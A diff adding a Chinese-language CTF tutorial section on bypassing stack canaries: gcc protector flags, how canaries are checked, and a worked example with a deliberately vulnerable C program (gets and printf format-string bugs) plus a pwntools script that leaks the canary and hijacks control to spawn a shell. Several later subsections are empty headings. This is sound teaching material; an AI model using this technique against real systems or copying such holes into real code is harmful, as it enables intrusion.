@@ -2767,9 +2767,145 @@ o.interactive()
 
 ## bypass canary
 
+### 介绍
+
+canary是为了防止栈溢出而衍生出的一种保护方式, 类似于cookie, 用于检测栈是否被修改, 但是还是有办法来绕过canary保护
+
+### canary保护
+
+gcc中提供了canary相关的参数
+
+```sh
+-fstack-protector		启用保护, 但是只会为含有局部变量或者数组的函数插入canary
+-fstack-protector-all	为所有函数插入canary
+-fstack-protector-strong	对包含有malloc族系或者内部的buffer大于8字节的或者包含局部数组的或者包含对local frame地址引用的函数使能canary
+-fstack-protector-explicit	只对明确有stack_protect attribute的函数开启保护
+-fno-stack-protector	禁用保护
+```
+
+我们可以写一个程序来看一下是如何插入canary和检测canary的
+
+```c
+#include<stdio.h>
+int main() {
+    printf("hello ctf\n");
+    return 0;
+}
+// gcc program.c -o program -fstack-protector-all
+```
+
+![image-20220403000734343](Self-help_Clown.assets/image-20220403000734343.png)
+
+从fs:28h获取一个随机值到rax, 然后插入到rbp-8的位置(也就是rbp的下一个栈帧), 当程序执行完后会将该值取出来到rdx, 然后用fs:28h和rdx进行异或, 如果相等则跳过执行\_\_stack\_chk\_fail, 该函数会直接退出程序, 如果不相等则会执行该函数
+
+![image-20220403001257103](Self-help_Clown.assets/image-20220403001257103.png)
+
+栈布局就如上图所示, 一般x86程序用的是gs寄存器, x64程序用的是fs寄存器, 我们动态调试来看一下canary值的一个特征
+
+![image-20220403002228686](Self-help_Clown.assets/image-20220403002228686.png)
+
+可以看到x64的canary刚好满一个栈帧. 最后以'\x00'结尾和其他内容隔断, x86的程序也一样, canary值充满一个栈帧以'\x00'结尾, pwndbg有一个命令可以直接查看canary, 键入`canary`就行
+
+![image-20220403002622855](Self-help_Clown.assets/image-20220403002622855.png)
+
+### printf leak canary
+
+我们知道格式化字符串漏洞可以实现任意读栈内的内容, 那么我们已经知道了canary也在栈内, 所以可以通过任意读获取canary的值然后实现绕过canary保护
+
+```c
+#include<stdio.h>
+#include<stdlib.h>
+void fun() {
+    system("/bin/sh");
+}
+
+int main() {
+    setbuf(stdin, 0);
+    setbuf(stdout, 0);
+    char buf[0x10];
+    gets(buf);
+    printf(buf);
+    gets(buf);
+    return 0;
+}
+// gcc program.c -o program -no-pie -fstack-protector-all
+```
+
+这道题就是简单的ret2text
+
+![image-20220403140809920](Self-help_Clown.assets/image-20220403140809920.png)
+
+但是添加了canary, 如果直接覆盖函数返回地址, 则程序会直接调用\_\_stack_chk_fail退出程序
+
+![image-20220403141212648](Self-help_Clown.assets/image-20220403141212648.png)
+
+buf偏移量为0x20 + 8
+
+![screenshots](Self-help_Clown.assets/screenshots.gif)
+
+可以看到回显了stack smashing detected, 也就是触发了canary保护机制
+
+程序除了有gets溢出, 还有一个格式化字符串漏洞, 我们就可以利用该漏洞泄露canary值, 但我们要先gdb调试来看一下格式化字符串漏洞中canary的栈帧偏移是多少, 在格式化字符串漏洞printf处设下断点
+
+![screenshots](Self-help_Clown.assets/screenshots-16489671940512.gif)
+
+可以数出来偏移量为9
+
+![screenshots](Self-help_Clown.assets/screenshots-16489673003194.gif)
+
+泄露出来的最后为'\x00', 且整个数字满8个字节, 所以这个就是canary
+
+那么我们在覆盖填充的时候把canary填充到对应的位置, 就不会触发保护机制
+
+```python
+from pwn import*
+o = process('./canary1')
+fun = 0x4006a7
+o.sendline("%9$p")
+canary = int(o.recv(18), 16)
+payload = 'a'*24 + p64(canary) + 'a'*8	# 填充canary
+payload += p64(fun)
+o.sendline(payload)
+o.interactive()
+```
+
+![image-20220403145013037](Self-help_Clown.assets/image-20220403145013037.png)
+
+![screenshots](Self-help_Clown.assets/screenshots-16489691158886.gif)
+
+### puts leak canary
+
+### write leak canary
+
+### scanf输入绕过canary
+
+### 爆破canary
 
 
-## stack smash
+
+### SSP leak
+
+
+
+### 劫持\_\_stack\_chk\_fail
+
+
+
+### 利用auxv控制
+
+
+
+### 参考
+
+-   https://www.anquanke.com/post/id/177832#h2-3
+-   https://www.tuicool.com/articles/MZbe2uq
+-   https://www.tuicool.com/articles/ra6RFj6
+-   https://www.tuicool.com/articles/BV7Nfaq
+-   https://www.tuicool.com/articles/NBZNZzu
+-   https://www.tuicool.com/articles/aeM7rmM
+-   https://www.tuicool.com/articles/yANjYzb
+-   https://www.tuicool.com/articles/qYbYrqe
+-   https://www.elttam.com/blog/playing-with-canaries/
 
 
 
